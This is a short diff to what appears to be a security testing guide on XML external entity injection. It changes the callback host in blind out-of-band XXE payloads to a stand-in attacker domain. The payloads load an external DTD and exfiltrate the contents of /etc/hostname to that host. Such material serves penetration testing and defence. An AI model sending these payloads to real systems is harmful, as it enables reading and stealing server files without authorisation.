@@ -282,14 +282,14 @@ curl -X POST 'https://app.example.com/api/import' \
 **Blind OOB (parameter entity + external DTD)**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR.oast.fun/xxe.dtd"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://CANARY.attacker.example/xxe.dtd"> %xxe;]>
 <root>test</root>
 ```
 
 Host `xxe.dtd` (HTTP) and confirm callback:
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-COLLABORATOR.oast.fun/?d=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://CANARY.attacker.example/?d=%file;'>">
 %eval;
 %exfil;
 ```
